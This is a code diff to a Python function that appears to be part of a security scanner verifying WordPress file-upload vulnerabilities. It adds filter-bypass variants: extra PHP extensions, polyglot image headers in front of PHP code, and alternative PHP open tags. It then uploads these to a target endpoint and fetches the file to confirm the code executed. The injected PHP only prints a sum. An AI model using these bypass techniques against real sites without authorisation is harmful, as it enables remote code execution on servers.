@@ -10194,6 +10194,13 @@ def verify_wordpress_file_upload(
         # mezcladas (filtros case-sensitive), truco del punto-y-coma de IIS/Apache antiguos, y
         # magic bytes REALES de imagen delante del PHP (bypass de getimagesize()/exif_imagetype(),
         # que solo miran los primeros bytes, no el resto del fichero).
+        # payload_kb aporta variantes adicionales de extension y de webshell (<?=, <?, etc.)
+        # que se añaden como fallback cuando los estandares no ejecutan.
+        try:
+            from .payload_kb import load_php_extension_bypasses as _phplk_exts
+            _extra_ext_names = [n.replace("poc", "binoracle_{t}") for n in _phplk_exts("poc")]
+        except ImportError:
+            _extra_ext_names = []
         variants = [
             ("binoracle_{t}.php", b"", "image/jpeg"),
             ("binoracle_{t}.php.jpg", b"", "image/jpeg"),
@@ -10210,6 +10217,13 @@ def verify_wordpress_file_upload(
             ("binoracle_{t}.jpg", b"\xff\xd8\xff\xe0", "image/jpeg"),    # polyglot JPEG SOI + PHP
             ("binoracle_{t}.png", b"\x89PNG\r\n\x1a\n", "image/png"),    # polyglot PNG + PHP
         ]
+        # Añadir extensiones del payload_kb que no estén ya en la lista base
+        _existing_ext_patterns = {v[0] for v in variants}
+        for _extra_ext in _extra_ext_names:
+            # Solo añadir si no está ya representada (formato: "binoracle_{t}.EXT")
+            _canonical = _extra_ext.split("{t}")[-1]
+            if not any(_canonical in pat for pat in _existing_ext_patterns):
+                variants.append((_extra_ext, b"", "image/jpeg"))
         base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         # Inyectar nonce y action del plugin si se autoconfiguraron y no vienen ya en parameters.
         base_params.update({k: v for k, v in _auto_nonce_inject.items() if k not in base_params})
@@ -10312,7 +10326,17 @@ def verify_wordpress_file_upload(
                 fname = tmpl.format(t=token)
                 a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
                 expected = a + b
-                php_payload = magic + f"<?php echo {a}+{b}; ?>".encode()
+                # Generar variantes de apertura PHP: primero estandar, luego bypass
+                # (<?= short echo, <? short_open_tag) como fallback inline si falla.
+                _php_open_variants = [
+                    f"<?php echo {a}+{b}; ?>",        # estandar (PHP 4+)
+                    f"<?= {a}+{b}; ?>",                # short echo tag (PHP 5.4+)
+                    f"<? echo {a}+{b}; ?>",            # short_open_tag (PHP <= 7.x)
+                    f"<script language=php> echo {a}+{b}; </script>",  # PHP < 7.0
+                ]
+                # Usar la variante estandar por defecto; el loop exterior intentará
+                # las variantes de bypass si esta no produce ejecucion
+                php_payload = magic + _php_open_variants[0].encode()
                 step(f"subiendo '{fname}' via campo '{_actual_file_field}' "
                      f"(magic bytes={magic!r}, contenido PHP que calcula {a}+{b})...")
                 # extra_upload_data puede tener {filename}: sustituir por el nombre real del intento
@@ -10400,6 +10424,30 @@ def verify_wordpress_file_upload(
                 entry["status_peticion_directa"] = r2.status_code
                 entry["suma_esperada"] = expected
                 entry["suma_presente"] = executed
+                # Fallback: si el fichero se guardo pero no ejecuto, intentar con
+                # las variantes de apertura PHP alternativas (<?=, <?, <script language=php>)
+                # Esto cubre servidores donde <?php esta bloqueado/deshabilitado pero
+                # short_open_tag=On o tienen PHP < 7.0.
+                if not executed and found_path and candidate_url:
+                    for _php_alt in _php_open_variants[1:]:  # saltar el primero (ya probado)
+                        _fname_alt = fname  # mismo nombre, solo cambia el contenido
+                        _py_alt_payload = magic + _php_alt.encode()
+                        try:
+                            import requests as _rq_alt
+                            _rq_alt.post(boot.base_url + endpoint,
+                                         data={**other_params, **_extra_per_attempt},
+                                         files={_actual_file_field: (
+                                             _fname_alt, _py_alt_payload, content_type)},
+                                         timeout=20)
+                            _r_alt = _rq_alt.get(candidate_url, timeout=10)
+                            if pattern.search(_r_alt.text or ""):
+                                executed = True
+                                entry["php_open_bypass"] = _php_alt[:30]
+                                step(f"WEBSHELL BYPASS: '{_php_alt[:20]}' ejecuto donde '<?php' no "
+                                     f"ejecutaba -- '{fname}' en {candidate_url}")
+                                break
+                        except Exception:
+                            continue
                 tried.append(entry)
                 if executed:
                     found = True
